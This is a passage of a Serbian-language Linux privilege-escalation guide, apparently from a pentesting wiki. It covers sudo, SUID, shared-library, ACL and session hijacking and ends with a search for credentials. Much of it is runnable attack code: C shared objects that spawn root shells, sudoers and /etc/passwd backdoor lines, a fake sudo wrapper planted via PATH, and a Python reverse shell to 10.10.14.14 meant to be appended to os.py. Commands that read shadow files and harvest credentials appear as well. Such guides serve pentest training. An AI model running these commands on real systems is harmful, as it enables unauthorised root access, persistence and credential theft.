Pogledajte [Docker](../linux-hardening/privilege-escalation/docker.md)

## Hijacking Java

Pogledajte [Java](../linux-hardening/privilege-escalation/java.md)

## Hijacking Polkit

Pogledajte [Polkit](../linux-hardening/privilege-escalation/polkit.md)

## Hijacking GPG keys

Pogledajte [GPG keys](../linux-hardening/privilege-escalation/gpg.md)

## Hijacking Gedit/Pluma/Xed

Pogledajte [Gedit/Pluma/Xed](../linux-hardening/privilege-escalation/gedit-pluma-xed.md)

## Hijacking Jupyter Notebook

Pogledajte [Jupyter Notebook](../linux-hardening/privilege-escalation/jupyter-notebook.md)

## Hijacking Perl

Pogledajte [Perl](../linux-hardening/privilege-escalation/perl.md)

## Hijacking Ruby

Pogledajte [Ruby](../linux-hardening/privilege-escalation/ruby.md)

## Hijacking Vim

Pogledajte [Vim](../linux-hardening/privilege-escalation/vim.md)

## Hijacking LESS

Pogledajte [LESS](../linux-hardening/privilege-escalation/less.md)

## Hijacking NET utils

Pogledajte [NET utils](../linux-hardening/privilege-escalation/net-utils.md)

## Hijacking Pager

Pogledajte [Pager](../linux-hardening/privilege-escalation/pager.md)

## Hijacking processes capabilities

Pogledajte [Process capabilities](../linux-hardening/privilege-escalation/process-capabilities.md)

## Hijacking printers

Pogledajte [Printers](../linux-hardening/privilege-escalation/printers.md)

## Hijacking RabbitMQ

Pogledajte [RabbitMQ](../linux-hardening/privilege-escalation/rabbitmq.md)

## Hijacking rsync

Pogledajte [rsync](../linux-hardening/privilege-escalation/rsync.md)

## Hijacking screen

Pogledajte [screen](../linux-hardening/privilege-escalation/screen.md)

## Hijacking tmux

Pogledajte [tmux](../linux-hardening/privilege-escalation/tmux.md)

## Hijacking Web Servers

Pogledajte [Web Servers](../linux-hardening/privilege-escalation/web-servers.md)

## Hijacking Xorg

Pogledajte [Xorg](../linux-hardening/privilege-escalation/xorg.md)

## Hijacking Nikto

Pogledajte [Nikto](../linux-hardening/privilege-escalation/nikto.md)

## Hijacking ZAP

Pogledajte [ZAP](../linux-hardening/privilege-escalation/zap.md)

## Hijacking Python SimpleHTTPServer

Pogledajte [Python SimpleHTTPServer](../linux-hardening/privilege-escalation/python-simplehttpserver.md)

## Hijacking Bash Shell

Pogledajte [Bash Shell](../linux-hardening/privilege-escalation/bash-shell.md)

## Hijacking su

Pogledajte [su](../linux-hardening/privilege-escalation/su.md)

## Hijacking pkexec

Pogledajte [pkexec](../linux-hardening/privilege-escalation/pkexec.md)

## Hijacking Snap packages

Pogledajte [Snap packages](../linux-hardening/privilege-escalation/snap-packages.md)

## Hijacking Flatpak packages

Pogledajte [Flatpak packages](../linux-hardening/privilege-escalation/flatpak-packages.md)

## Hijacking Containers

Pogledajte [Containers](../linux-hardening/privilege-escalation/containers.md)

## Hijacking Git

Pogledajte [Git](../linux-hardening/privilege-escalation/git.md)
```c
#include <stdio.h>
#include <sys/types.h>
#include <stdlib.h>

void _init() {
unsetenv("LD_PRELOAD");
setgid(0);
setuid(0);
system("/bin/bash");
}
```
Zatim **kompajliraj ga** koristeći:
```bash
cd /tmp
gcc -fPIC -shared -o pe.so pe.c -nostartfiles
```
Na kraju, **eskalirajte privilegije** pokretanjem
```bash
sudo LD_PRELOAD=./pe.so <COMMAND> #Use any command you can run with sudo
```
> [!CAUTION]
> Slična privesc može biti zloupotrebljena ako napadač kontroliše **LD_LIBRARY_PATH** env variable jer kontroliše putanju gde će biblioteke biti tražene.
```c
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
unsetenv("LD_LIBRARY_PATH");
setresuid(0,0,0);
system("/bin/bash -p");
}
```

```bash
# Compile & execute
cd /tmp
gcc -o /tmp/libcrypt.so.1 -shared -fPIC /home/user/tools/sudo/library_path.c
sudo LD_LIBRARY_PATH=/tmp <COMMAND>
```
### SUID Binary – .so injection

Kada naiđete na binarnu datoteku sa **SUID** permisijama koja deluje neuobičajeno, dobra je praksa da proverite da li pravilno učitava **.so** fajlove. To se može proveriti pokretanjem sledeće komande:
```bash
strace <SUID-BINARY> 2>&1 | grep -i -E "open|access|no such file"
```
Na primer, nailazak na grešku poput _"open(“/path/to/.config/libcalc.so”, O_RDONLY) = -1 ENOENT (No such file or directory)"_ sugeriše potencijal za exploitation.

Da bi se to iskoristilo, treba kreirati C fajl, recimo _"/path/to/.config/libcalc.c"_, koji sadrži sledeći kod:
```c
#include <stdio.h>
#include <stdlib.h>

static void inject() __attribute__((constructor));

void inject(){
system("cp /bin/bash /tmp/bash && chmod +s /tmp/bash && /tmp/bash -p");
}
```
Ovaj kod, kada se jednom kompajlira i izvrši, ima za cilj da podigne privilegije manipulisanjem dozvolama fajla i pokretanjem shell-a sa povišenim privilegijama.

Kompajlirajte gornji C fajl u shared object (.so) fajl sa:
```bash
gcc -shared -o /path/to/.config/libcalc.so -fPIC /path/to/.config/libcalc.c
```
Na kraju, pokretanje pogođenog SUID binary-ja trebalo bi da pokrene exploit, omogućavajući potencijalni compromise sistema.

## Shared Object Hijacking
```bash
# Lets find a SUID using a non-standard library
ldd some_suid
something.so => /lib/x86_64-linux-gnu/something.so

# The SUID also loads libraries from a custom location where we can write
readelf -d payroll  | grep PATH
0x000000000000001d (RUNPATH)            Library runpath: [/development]
```
Sada kada smo pronašli SUID binar koji učitava biblioteku iz fascikle u koju možemo da pišemo, hajde da kreiramo biblioteku u toj fascikli sa potrebnim imenom:
```c
//gcc src.c -fPIC -shared -o /development/libshared.so
#include <stdio.h>
#include <stdlib.h>

static void hijack() __attribute__((constructor));

void hijack() {
setresuid(0,0,0);
system("/bin/bash -p");
}
```
Ako dobijete grešku kao što je
```shell-session
./suid_bin: symbol lookup error: ./suid_bin: undefined symbol: a_function_name
```
to znači da библиотека koju ste generisali treba da ima funkciju called `a_function_name`.

### GTFOBins

[**GTFOBins**](https://gtfobins.github.io) je kurirana lista Unix binarnih fajlova koji mogu biti exploited od strane napadača da zaobiđu lokalna bezbednosna ograničenja. [**GTFOArgs**](https://gtfoargs.github.io/) je isto to, ali za slučajeve kada možete **samo da injektujete argumente** u komandu.

Projekat prikuplja legitimne funkcije Unix binarnih fajlova koje mogu biti abused da se pobegne iz restricted shell-ova, escalates ili zadrže elevated privileges, prenose fajlove, pokreću bind i reverse shells, i olakšavaju druge post-exploitation zadatke.

> gdb -nx -ex '!sh' -ex quit\
> sudo mysql -e '! /bin/sh'\
> strace -o /dev/null /bin/sh\
> sudo awk 'BEGIN {system("/bin/sh")}'


{{#ref}}
https://gtfobins.github.io/
{{#endref}}


{{#ref}}
https://gtfoargs.github.io/
{{#endref}}

### FallOfSudo

Ako možete da pristupite `sudo -l`, možete koristiti alat [**FallOfSudo**](https://github.com/CyberOne-Security/FallofSudo) da proverite da li pronalazi kako da iskoristi bilo koje sudo pravilo.

### Reusing Sudo Tokens

U slučajevima kada imate **sudo access** ali ne i lozinku, možete eskalirati privileges tako što ćete **sačekati izvršavanje sudo komande i zatim hijackovati session token**.

Zahtevi za eskalaciju privileges:

- Već imate shell kao korisnik "_sampleuser_"
- "_sampleuser_" je **koristio `sudo`** da izvrši nešto u **poslednjih 15min** (podrazumevano, to je trajanje sudo tokena koje nam omogućava da koristimo `sudo` bez unošenja lozinke)
- `cat /proc/sys/kernel/yama/ptrace_scope` je 0
- `gdb` je dostupan (možete ga uploadovati)

(Možete privremeno da omogućite `ptrace_scope` sa `echo 0 | sudo tee /proc/sys/kernel/yama/ptrace_scope` ili trajno izmenom `/etc/sysctl.d/10-ptrace.conf` i postavljanjem `kernel.yama.ptrace_scope = 0`)

Ako su svi ovi zahtevi ispunjeni, **možete eskalirati privileges koristeći:** [**https://github.com/nongiach/sudo_inject**](https://github.com/nongiach/sudo_inject)

- **Prvi exploit** (`exploit.sh`) će kreirati binary `activate_sudo_token` u _/tmp_. Možete ga koristiti da **aktivirate sudo token u svojoj sesiji** (nećete automatski dobiti root shell, uradite `sudo su`):
```bash
bash exploit.sh
/tmp/activate_sudo_token
sudo su
```
- Drugi **exploit** (`exploit_v2.sh`) će kreirati `sh` shell u _/tmp_ **u vlasništvu root-a sa setuid**
```bash
bash exploit_v2.sh
/tmp/sh -p
```
- **Treći exploit** (`exploit_v3.sh`) će **kreirati sudoers fajl** koji čini da su **sudo tokeni trajni i omogućava svim korisnicima da koriste sudo**
```bash
bash exploit_v3.sh
sudo su
```
### /var/run/sudo/ts/\<Username>

Ako imate **write permissions** u folderu ili nad bilo kojim od kreiranih fajlova unutar foldera, možete da koristite binarni fajl [**write_sudo_token**](https://github.com/nongiach/sudo_inject/tree/master/extra_tools) da biste **kreirali sudo token za korisnika i PID**.\
Na primer, ako možete da pregazite fajl _/var/run/sudo/ts/sampleuser_ i imate shell kao taj korisnik sa PID-om 1234, možete da **dobijete sudo privileges** bez potrebe da znate lozinku tako što ćete uraditi:
```bash
./write_sudo_token 1234 > /var/run/sudo/ts/sampleuser
```
### /etc/sudoers, /etc/sudoers.d

Fajl `/etc/sudoers` i fajlovi unutar `/etc/sudoers.d` podešavaju ko može da koristi `sudo` i kako. Ove fajlove **podrazumevano mogu da čitaju samo korisnik root i grupa root**.\
**Ako** možeš da **pročitaš** ovaj fajl, mogao bi da **pribaviš neke zanimljive informacije**, a ako možeš da **upišeš** bilo koji fajl, moći ćeš da **eskaliraš privilegije**.
```bash
ls -l /etc/sudoers /etc/sudoers.d/
ls -ld /etc/sudoers.d/
```
Ako možeš da pišeš, možeš da zloupotrebiš ovu dozvolu
```bash
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers
echo "$(whoami) ALL=(ALL) NOPASSWD: ALL" >> /etc/sudoers.d/README
```
Drugi način da se zloupotrebe ove dozvole:
```bash
# makes it so every terminal can sudo
echo "Defaults !tty_tickets" > /etc/sudoers.d/win
# makes it so sudo never times out
echo "Defaults timestamp_timeout=-1" >> /etc/sudoers.d/win
```
### DOAS

Postoje neke alternative za `sudo` binarnu datoteku kao što je `doas` za OpenBSD, zapamti da proveriš njegovu konfiguraciju u `/etc/doas.conf`
```
permit nopass demo as root cmd vim
```
### Sudo Hijacking

Ako znate da se **korisnik obično povezuje na mašinu i koristi `sudo`** za eskalaciju privilegija i dobili ste shell u tom korisničkom kontekstu, možete **kreirati novi `sudo` executable** koji će izvršiti vaš kod kao root, a zatim korisnikovu komandu. Zatim, **izmenite $PATH** korisničkog konteksta (na primer dodavanjem nove putanje u .bash_profile) tako da kada korisnik izvrši sudo, vaš `sudo` executable bude pokrenut.

Imajte na umu da ako korisnik koristi drugačiji shell (ne bash), moraćete da izmenite druge fajlove kako biste dodali novu putanju. Na primer [sudo-piggyback](https://github.com/APTy/sudo-piggyback) menja `~/.bashrc`, `~/.zshrc`, `~/.bash_profile`. Drugi primer možete pronaći u [bashdoor.py](https://github.com/n00py/pOSt-eX/blob/master/empire_modules/bashdoor.py)

Ili pokretanjem nečega poput:
```bash
cat >/tmp/sudo <<EOF
#!/bin/bash
/usr/bin/sudo whoami > /tmp/privesc
/usr/bin/sudo "\$@"
EOF
chmod +x /tmp/sudo
echo ‘export PATH=/tmp:$PATH’ >> $HOME/.zshenv # or ".bashrc" or any other

# From the victim
zsh
echo $PATH
sudo ls
```
## Shared Library

### ld.so

Fajl `/etc/ld.so.conf` pokazuje **odakle se učitavaju konfiguracioni fajlovi**. Obično ovaj fajl sadrži sledeću putanju: `include /etc/ld.so.conf.d/*.conf`

To znači da će konfiguracioni fajlovi iz `/etc/ld.so.conf.d/*.conf` biti učitani. Ovi konfiguracioni fajlovi **ukazuju na druge foldere** u kojima će se **tražiti** **libraries**. Na primer, sadržaj `/etc/ld.so.conf.d/libc.conf` je `/usr/local/lib`. **To znači da će sistem tražiti libraries unutar `/usr/local/lib`**.

Ako iz nekog razloga **korisnik ima write permissions** nad bilo kojom od navedenih putanja: `/etc/ld.so.conf`, `/etc/ld.so.conf.d/`, bilo kojim fajlom unutar `/etc/ld.so.conf.d/` ili bilo kojim folderom unutar config fajla u `/etc/ld.so.conf.d/*.conf`, možda će moći da escalate privileges.\
Pogledajte **kako da iskoristite ovu misconfiguration** na sledećoj stranici:


{{#ref}}
ld.so.conf-example.md
{{#endref}}

### RPATH
```
level15@nebula:/home/flag15$ readelf -d flag15 | egrep "NEEDED|RPATH"
0x00000001 (NEEDED)                     Shared library: [libc.so.6]
0x0000000f (RPATH)                      Library rpath: [/var/tmp/flag15]

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x0068c000)
libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x005bb000)
```
Kopiranjem `lib` u `/var/tmp/flag15/`, program će je koristiti na ovom mestu, kao što je navedeno u promenljivoj `RPATH`.
```
level15@nebula:/home/flag15$ cp /lib/i386-linux-gnu/libc.so.6 /var/tmp/flag15/

level15@nebula:/home/flag15$ ldd ./flag15
linux-gate.so.1 =>  (0x005b0000)
libc.so.6 => /var/tmp/flag15/libc.so.6 (0x00110000)
/lib/ld-linux.so.2 (0x00737000)
```
Zatim napravite zlonamernu library u `/var/tmp` sa `gcc -fPIC -shared -static-libgcc -Wl,--version-script=version,-Bstatic exploit.c -o libc.so.6`
```c
#include<stdlib.h>
#define SHELL "/bin/sh"

int __libc_start_main(int (*main) (int, char **, char **), int argc, char ** ubp_av, void (*init) (void), void (*fini) (void), void (*rtld_fini) (void), void (* stack_end))
{
char *file = SHELL;
char *argv[] = {SHELL,0};
setresuid(geteuid(),geteuid(), geteuid());
execve(file,argv,0);
}
```
## Capabilities

Linux capabilities obezbeđuju **podskup dostupnih root privilegija procesu**. Time se root **privilegije praktično dele na manje i različite jedinice**. Svaka od ovih jedinica može se zatim nezavisno dodeliti procesima. Na ovaj način se smanjuje kompletan skup privilegija, čime se umanjuju rizici od exploitation.\
Pročitajte sledeću stranicu da biste **saznali više o capabilities i kako da ih abuseujete**:


{{#ref}}
linux-capabilities.md
{{#endref}}

## Directory permissions

U direktorijumu, **bit za "execute"** podrazumeva da pogođeni korisnik može da uđe u folder pomoću "**cd**".\
**"read"** bit podrazumeva da korisnik može da **izlista** **fajlove**, a **"write"** bit podrazumeva da korisnik može da **obriše** i **kreira** nove **fajlove**.

## ACLs

Access Control Lists (ACLs) predstavljaju sekundarni sloj diskrecionih dozvola, sposoban da **nadjača tradicionalne ugo/rwx permissions**. Ove dozvole unapređuju kontrolu pristupa fajlovima ili direktorijumima tako što omogućavaju ili zabranjuju prava određenim korisnicima koji nisu vlasnici niti deo grupe. Ovaj nivo **granularnosti obezbeđuje preciznije upravljanje pristupom**. Više detalja možete pronaći [**ovde**](https://linuxconfig.org/how-to-manage-acls-on-linux).

**Dajte** korisniku "kali" read i write dozvole nad fajlom:
```bash
setfacl -m u:kali:rw file.txt
#Set it in /etc/sudoers or /etc/sudoers.d/README (if the dir is included)

setfacl -b file.txt #Remove the ACL of the file
```
**Uzmite** fajlove sa specifičnim ACL-ovima iz sistema:
```bash
getfacl -t -s -R -p /bin /etc /home /opt /root /sbin /usr /tmp 2>/dev/null
```
### Skriveni ACL backdoor u sudoers drop-ins

Česta pogrešna konfiguracija je fajl u vlasništvu root-a u `/etc/sudoers.d/` sa modom `440` koji i dalje daje write pristup niskoprivilegovanom korisniku putem ACL.
```bash
ls -l /etc/sudoers.d/*
getfacl /etc/sudoers.d/<file>
```
Ako vidite nešto poput `user:alice:rw-`, korisnik može da doda sudo pravilo uprkos restriktivnim mode bitovima:
```bash
echo 'alice ALL=(ALL) NOPASSWD:ALL' >> /etc/sudoers.d/<file>
visudo -cf /etc/sudoers.d/<file>
sudo -l
```
Ovo je put ACL persistence/privesc visokog uticaja jer se lako promaši u pregledima koji koriste samo `ls -l`.

## Otvorene shell sesije

U **starijim verzijama** možete **hijack**-ovati neku **shell** sesiju drugog korisnika (**root**).\
U **najnovijim verzijama** moći ćete da se **connect**-ujete na screen sesije samo svog korisnika. Međutim, mogli biste pronaći **interesting information** unutar sesije.

### screen sessions hijacking

**List screen sessions**
```bash
screen -ls
screen -ls <username>/ # Show another user' screen sessions

# Socket locations (some systems expose one as symlink of the other)
ls /run/screen/ /var/run/screen/ 2>/dev/null
```
![](<../../images/image (141).png>)

**Priključi se sesiji**
```bash
screen -dr <session> #The -d is to detach whoever is attached to it
screen -dr 3350.foo #In the example of the image
screen -x [user]/[session id]
```
## hijacking tmux sesija

Ovo je bio problem sa **starim tmux verzijama**. Nisam uspeo da hijack-ujem tmux (v2.1) sesiju koju je kreirao root kao neprivilegovan korisnik.

**Prikaži tmux sesije**
```bash
tmux ls
ps aux | grep tmux #Search for tmux consoles not using default folder for sockets
tmux -S /tmp/dev_sess ls #List using that socket, you can start a tmux session in that socket with: tmux -S /tmp/dev_sess
```
![](<../../images/image (837).png>)

**Prikači se na sesiju**
```bash
tmux attach -t myname #If you write something in this session it will appears in the other opened one
tmux attach -d -t myname #First detach the session from the other console and then access it yourself

ls -la /tmp/dev_sess #Check who can access it
rw-rw---- 1 root devs 0 Sep  1 06:27 /tmp/dev_sess #In this case root and devs can
# If you are root or devs you can access it
tmux -S /tmp/dev_sess attach -t 0 #Attach using a non-default tmux socket
```
Check **Valentine box from HTB** for an example.

## SSH

### Debian OpenSSL Predictable PRNG - CVE-2008-0166

Svi SSL i SSH ključevi generisani na Debian baziranim sistemima (Ubuntu, Kubuntu, itd) između septembra 2006. i 13. maja 2008. mogu biti pogođeni ovom greškom.\
Ova greška nastaje prilikom kreiranja novog ssh ključa na tim OS, jer je **bilo moguće samo 32,768 varijacija**. To znači da se sve mogućnosti mogu izračunati i **imajući ssh public key možeš da potražiš odgovarajući private key**. Izračunate mogućnosti možeš pronaći ovde: [https://github.com/g0tmi1k/debian-ssh](https://github.com/g0tmi1k/debian-ssh)

### SSH Interesting configuration values

- **PasswordAuthentication:** Određuje da li je password authentication dozvoljena. Podrazumevana vrednost je `no`.
- **PubkeyAuthentication:** Određuje da li je public key authentication dozvoljena. Podrazumevana vrednost je `yes`.
- **PermitEmptyPasswords**: Kada je password authentication dozvoljena, određuje da li server dozvoljava prijavu na naloge sa praznim password stringovima. Podrazumevana vrednost je `no`.

### Login control files

Ovi fajlovi utiču na to ko može da se prijavi i kako:

- **`/etc/nologin`**: ako postoji, blokira non-root prijave i ispisuje svoju poruku.
- **`/etc/securetty`**: ograničava gde root može da se prijavi (TTY allowlist).
- **`/etc/motd`**: post-login banner (može leak-ovati informacije o environment ili maintenance detaljima).

### PermitRootLogin

Određuje da li root može da se prijavi koristeći ssh, podrazumevano je `no`. Moguće vrednosti:

- `yes`: root can login using password and private key
- `without-password` or `prohibit-password`: root can only login with a private key
- `forced-commands-only`: Root can login only using private key and if the commands options are specified
- `no` : no

### AuthorizedKeysFile

Određuje fajlove koji sadrže public keys koje mogu da se koriste za user authentication. Može da sadrži tokene kao `%h`, koji će biti zamenjeni home direktorijumom. **Možeš navesti apsolutne putanje** (počevši od `/`) ili **relativne putanje iz user's home**. Na primer:
```bash
AuthorizedKeysFile    .ssh/authorized_keys access
```
Ta konfiguracija će pokazati da ako pokušate da se prijavite sa **privatnim** ključem korisnika "**testusername**", ssh će uporediti javni ključ vašeg ključa sa onima koji se nalaze u `/home/testusername/.ssh/authorized_keys` i `/home/testusername/access`

### ForwardAgent/AllowAgentForwarding

SSH agent forwarding vam omogućava da **koristite svoje lokalne SSH ključeve umesto da ostavljate ključeve** (bez passphrase-ova!) na vašem serveru. Tako ćete moći da **pređete** preko ssh **na host** i odatle **pređete na drugi** host **koristeći** **ključ** koji se nalazi na vašem **početnom hostu**.

Morate da podesite ovu opciju u `$HOME/.ssh.config` ovako:
```
Host example.com
ForwardAgent yes
```
Obratite pažnju da ako je `Host` `*`, svaki put kada korisnik pređe na drugu mašinu, taj host će moći da pristupi ključevima (što je bezbednosni problem).

Fajl `/etc/ssh_config` može da **override** ove **options** i dozvoli ili zabrani ovu konfiguraciju.\
Fajl `/etc/sshd_config` može da **allow** ili **denied** ssh-agent forwarding uz keyword `AllowAgentForwarding` (default je allow).

Ako otkrijete da je Forward Agent konfigurisan u environmentu, pročitajte sledeću stranicu jer **možda možete da je abuse-ujete da eskalirate privilegije**:


{{#ref}}
ssh-forward-agent-exploitation.md
{{#endref}}

## Interesting Files

### Profiles files

Fajl `/etc/profile` i fajlovi unutar `/etc/profile.d/` su **scripts that are executed when a user runs a new shell**. Dakle, ako možete da **write ili modify** bilo koji od njih, možete eskalirati privilegije.
```bash
ls -l /etc/profile /etc/profile.d/
```
If any weird profile script is found you should check it for **osetljive detalje**.

### Passwd/Shadow Files

U zavisnosti od OS-a, `/etc/passwd` i `/etc/shadow` fajlovi mogu koristiti drugačije ime ili može postojati backup. Zato se preporučuje da **pronađete sve njih** i **proverite da li možete da ih čitate** kako biste videli **da li postoje heševi** unutar fajlova:
```bash
#Passwd equivalent files
cat /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
#Shadow equivalent files
cat /etc/shadow /etc/shadow- /etc/shadow~ /etc/gshadow /etc/gshadow- /etc/master.passwd /etc/spwd.db /etc/security/opasswd 2>/dev/null
```
U nekim slučajevima možete pronaći **password hashes** unutar `/etc/passwd` (ili ekvivalentne) datoteke
```bash
grep -v '^[^:]*:[x\*]' /etc/passwd /etc/pwd.db /etc/master.passwd /etc/group 2>/dev/null
```
### Upisiv /etc/passwd

Prvo, generiši lozinku jednom od sledećih komandi.
```
openssl passwd -1 -salt hacker hacker
mkpasswd -m SHA-512 hacker
python2 -c 'import crypt; print crypt.crypt("hacker", "$6$salt")'
```
Zatim dodajte korisnika `hacker` i dodajte generisanu lozinku.
```
hacker:GENERATED_PASSWORD_HERE:0:0:Hacker:/root:/bin/bash
```
E.g: `hacker:$1$hacker$TzyKlv0/R/c28R.GAeLw.1:0:0:Hacker:/root:/bin/bash`

Sada možete koristiti `su` komandu sa `hacker:hacker`

Alternativno, možete koristiti sledeće linije da dodate dummy korisnika bez lozinke.\
WARNING: možda ćete pogoršati trenutnu bezbednost mašine.
```
echo 'dummy::0:0::/root:/bin/bash' >>/etc/passwd
su - dummy
```
NAPOMENA: Na BSD platformama `/etc/passwd` se nalazi u `/etc/pwd.db` i `/etc/master.passwd`, a `/etc/shadow` je preimenovan u `/etc/spwd.db`.

Treba da proveriš da li možeš da **pišeš u neke osetljive fajlove**. Na primer, da li možeš da pišeš u neki **fajl konfiguracije servisa**?
```bash
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' 2>/dev/null | grep -v '/proc/' | grep -v $HOME | sort | uniq #Find files owned by the user or writable by anybody
for g in `groups`; do find \( -type f -or -type d \) -group $g -perm -g=w 2>/dev/null | grep -v '/proc/' | grep -v $HOME; done #Find files writable by any group of the user
```
Na primer, ako mašina pokreće **tomcat** server i možete da **izmenite Tomcat service configuration file inside /etc/systemd/,** onda možete da izmenite linije:
```
ExecStart=/path/to/backdoor
User=root
Group=root
```
Tvoja backdoor će biti izvršena sledeći put kada se tomcat pokrene.

### Proveri foldere

Sledeći folderi mogu sadržati bekape ili zanimljive informacije: **/tmp**, **/var/tmp**, **/var/backups, /var/mail, /var/spool/mail, /etc/exports, /root** (Verovatno nećeš moći da pročitaš poslednji, ali pokušaj)
```bash
ls -a /tmp /var/tmp /var/backups /var/mail/ /var/spool/mail/ /root
```
### Čudne lokacije/owned fajlovi
```bash
#root owned files in /home folders
find /home -user root 2>/dev/null
#Files owned by other users in folders owned by me
for d in `find /var /etc /home /root /tmp /usr /opt /boot /sys -type d -user $(whoami) 2>/dev/null`; do find $d ! -user `whoami` -exec ls -l {} \; 2>/dev/null; done
#Files owned by root, readable by me but not world readable
find / -type f -user root ! -perm -o=r 2>/dev/null
#Files owned by me or world writable
find / '(' -type f -or -type d ')' '(' '(' -user $USER ')' -or '(' -perm -o=w ')' ')' ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
#Writable files by each group I belong to
for g in `groups`;
do printf "  Group $g:\n";
find / '(' -type f -or -type d ')' -group $g -perm -g=w ! -path "/proc/*" ! -path "/sys/*" ! -path "$HOME/*" 2>/dev/null
done
done
```
### Izmenjene datoteke u poslednjih nekoliko minuta
```bash
find / -type f -mmin -5 ! -path "/proc/*" ! -path "/sys/*" ! -path "/run/*" ! -path "/dev/*" ! -path "/var/lib/*" 2>/dev/null
```
### Sqlite DB fajlovi
```bash
find / -name '*.db' -o -name '*.sqlite' -o -name '*.sqlite3' 2>/dev/null
```
### \*\_history, .sudo_as_admin_successful, profile, bashrc, httpd.conf, .plan, .htpasswd, .git-credentials, .rhosts, hosts.equiv, Dockerfile, docker-compose.yml fajlovi
```bash
find / -type f \( -name "*_history" -o -name ".sudo_as_admin_successful" -o -name ".profile" -o -name "*bashrc" -o -name "httpd.conf" -o -name "*.plan" -o -name ".htpasswd" -o -name ".git-credentials" -o -name "*.rhosts" -o -name "hosts.equiv" -o -name "Dockerfile" -o -name "docker-compose.yml" \) 2>/dev/null
```
### Sakrivene datoteke
```bash
find / -type f -iname ".*" -ls 2>/dev/null
```
### **Script/Binaries u PATH**
```bash
for d in `echo $PATH | tr ":" "\n"`; do find $d -name "*.sh" 2>/dev/null; done
for d in `echo $PATH | tr ":" "\n"`; do find $d -type f -executable 2>/dev/null; done
```
### **Web fajlovi**
```bash
ls -alhR /var/www/ 2>/dev/null
ls -alhR /srv/www/htdocs/ 2>/dev/null
ls -alhR /usr/local/www/apache22/data/
ls -alhR /opt/lampp/htdocs/ 2>/dev/null
```
### **Bekapi**
```bash
find /var /etc /bin /sbin /home /usr/local/bin /usr/local/sbin /usr/bin /usr/games /usr/sbin /root /tmp -type f \( -name "*backup*" -o -name "*\.bak" -o -name "*\.bck" -o -name "*\.bk" \) 2>/dev/null
```
### Poznati fajlovi koji sadrže lozinke

Pročitajte kod [**linPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/linPEAS), on pretražuje **nekoliko mogućih fajlova koji bi mogli da sadrže lozinke**.\
**Još jedan zanimljiv alat** koji možete koristiti za to je: [**LaZagne**](https://github.com/AlessandroZ/LaZagne), open source aplikacija koja se koristi za preuzimanje velikog broja lozinki sačuvanih na lokalnom računaru za Windows, Linux i Mac.

### Logovi

Ako možete da čitate logove, možda ćete moći da pronađete **zanimljive/povjerljive informacije unutar njih**. Što je log neobičniji, to će verovatno biti zanimljiviji.\
Takođe, neki "**loše**" konfigurisani (backdoored?) **audit logovi** mogu da vam omoguće da **zabeležite lozinke** unutar audit logova, kao što je objašnjeno u ovom postu: [https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/](https://www.redsiege.com/blog/2019/05/logging-passwords-on-linux/).
```bash
aureport --tty | grep -E "su |sudo " | sed -E "s,su|sudo,${C}[1;31m&${C}[0m,g"
grep -RE 'comm="su"|comm="sudo"' /var/log* 2>/dev/null
```
Da biste **čitали logove**, grupa [**adm**](interesting-groups-linux-pe/index.html#adm-group) će biti veoma korisna.

### Shell fajlovi
```bash
~/.bash_profile # if it exists, read it once when you log in to the shell
~/.bash_login # if it exists, read it once if .bash_profile doesn't exist
~/.profile # if it exists, read once if the two above don't exist
/etc/profile # only read if none of the above exists
~/.bashrc # if it exists, read it every time you start a new shell
~/.bash_logout # if it exists, read when the login shell exits
~/.zlogin #zsh shell
~/.zshrc #zsh shell
```
### Generic Creds Search/Regex

Takođe bi trebalo da proveriš fajlove koji u **imenu** ili unutar **sadržaja** imaju reč "**password**", kao i da proveriš IP adrese i emailove unutar logova, ili regexe za hash-eve.\
Neću ovde nabrajati kako sve to da uradiš, ali ako te zanima, možeš da pogledaš poslednje provere koje izvodi [**linpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/blob/master/linPEAS/linpeas.sh).

## Writable files

### Python library hijacking

Ako znaš **odakle** će python skripta biti pokrenuta i možeš da **pišeš unutar** tog foldera ili možeš da **menjaš python biblioteke**, možeš da izmeniš OS biblioteku i ubaciš backdoor u nju (ako možeš da pišeš tamo gde će python skripta biti pokrenuta, kopiraj i nalepi biblioteku os.py).

Da bi **ubacio backdoor u biblioteku**, samo dodaj na kraj os.py biblioteke sledeću liniju (promeni IP i PORT):
```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.10.14.14",5678));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);
```
### Logrotate exploitation

Ranjivost u `logrotate` omogućava korisnicima sa **write permissions** na log fajl ili njegovim parent direktorijumima da potencijalno dobiju eskalirane privilegije. To je zato što `logrotate`, koji često radi kao **root**, može biti manipulisán da izvrši proizvoljne fajlove, posebno u direktorijumima kao što je _**/etc/bash_completion.d/**_. Važno je proveriti permissions ne samo u _/var/log_ već i u svakom direktorijumu gde se primenjuje rotacija logova.

> [!TIP]
> Ova ranjivost utiče na `logrotate` verziju `3.18.0` i starije

Detaljnije informacije o ranjivosti mogu se naći na ovoj stranici: [https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition](https://tech.feedyourhead.at/content/details-of-a-logrotate-race-condition).

Ovu ranjivost možete eksploatisati pomoću [**logrotten**](https://github.com/whotwagner/logrotten).

Ova ranjivost je veoma slična [**CVE-2016-1247**](https://www.cvedetails.com/cve/CVE-2016-1247/) **(nginx logs),** pa kad god otkrijete da možete menjati logs, proverite ko upravlja tim logs i proverite da li možete da eskalirate privilegije zamenom logs symlinks.

### /etc/sysconfig/network-scripts/ (Centos/Redhat)

**Vulnerability reference:** [**https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure\&qid=e026a0c5f83df4fd532442e1324ffa4f**](https://vulmon.com/exploitdetails?qidtp=maillist_fulldisclosure&qid=e026a0c5f83df4fd532442e1324ffa4f)

